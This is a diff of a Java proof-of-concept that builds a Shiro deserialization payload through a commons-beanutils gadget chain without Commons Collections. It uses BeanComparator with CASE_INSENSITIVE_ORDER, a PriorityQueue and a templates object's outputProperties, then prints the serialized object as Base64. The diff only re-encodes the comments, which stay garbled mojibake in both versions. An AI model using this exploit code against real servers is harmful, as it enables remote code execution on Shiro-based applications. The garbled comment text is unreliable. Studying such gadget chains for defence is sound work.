@@ -12,16 +12,16 @@ import java.util.Base64;
 import java.util.PriorityQueue;
 
 /**
- * ShiroÖĞ¾ÍÊÇÖ»ÓĞCBÃ»ÓĞCC
+ * Shiroä¸­å°±æ˜¯åªæœ‰CBæ²¡æœ‰CC
  *
- * ĞèÒªÂú×ãÈı¸öÌõ¼ş£º
- * ÊµÏÖjava.util.Comparator½Ó¿Ú
- * ÊµÏÖjava.io.Serializable½Ó¿Ú
- * Java¡¢shiro»òcommons-beanutils×Ô´ø£¬ÇÒ¼æÈİĞÔÇ¿
+ * éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š
+ * å®ç°java.util.Comparatoræ¥å£
+ * å®ç°java.io.Serializableæ¥å£
+ * Javaã€shiroæˆ–commons-beanutilsè‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º
  *
- * Í¨¹ıËÑË÷·¢ÏÖCaseInsensitiveComparator
- * Õâ¸öCaseInsensitiveComparatorÀàÊÇjava.lang.StringÀàÏÂµÄÒ»¸öÄÚ²¿Ë½ÓĞÀà£¬ÆäÊµÏÖÁËComparatorºÍSerializable£¬
- * Í¨¹ıString.CASE_INSENSITIVE_ORDER¼´¿ÉÄÃµ½ÉÏÏÂÎÄÖĞµÄCaseInsensitiveComparator¶ÔÏó£¬ÓÃËüÀ´ÊµÀı»¯BeanComparator
+ * é€šè¿‡æœç´¢å‘ç°CaseInsensitiveComparator
+ * è¿™ä¸ªCaseInsensitiveComparatorç±»æ˜¯java.lang.Stringç±»ä¸‹çš„ä¸€ä¸ªå†…éƒ¨ç§æœ‰ç±»ï¼Œå…¶å®ç°äº†Comparatorå’ŒSerializableï¼Œ
+ * é€šè¿‡String.CASE_INSENSITIVE_ORDERå³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„CaseInsensitiveComparatorå¯¹è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ–BeanComparator
  *
  */
 public class CB_withoutCC {
@@ -49,26 +49,26 @@ public class CB_withoutCC {
 
 
         /**
-         * ÔÚBeanComparatorÀàµÄ¹¹Ôìº¯Êı´¦£¬µ±Ã»ÓĞÏÔÊ½´«ÈëComparatorµÄÇé¿öÏÂ£¬ÔòÄ¬ÈÏÊ¹ÓÃComparableComparator
-         *BeanComparatorÓÃÀ´±È½ÏÁ½¸öJavaBeanÊÇ·ñÏàµÈµÄÀà
+         * åœ¨BeanComparatorç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥Comparatorçš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ComparableComparator
+         *BeanComparatorç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªJavaBeanæ˜¯å¦ç›¸ç­‰çš„ç±»
          */
         BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
         PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
         queue.add("1");
         queue.add("1");
 
-        //ÉèÖÃproperty
+        //è®¾ç½®property
         setFieldValue(beanComparator, "property", "outputProperties");
         setFieldValue(queue, "queue", new Object[]{templates, templates});
 
-        //ĞòÁĞ»¯
+        //åºåˆ—åŒ–
         ByteArrayOutputStream baor = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baor);
         oos.writeObject(queue);
         oos.close();
         System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
 
-        //·´ĞòÁĞ»¯
+        //ååºåˆ—åŒ–
         ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
         ObjectInputStream ois = new ObjectInputStream(bais);
         Object o = ois.readObject();
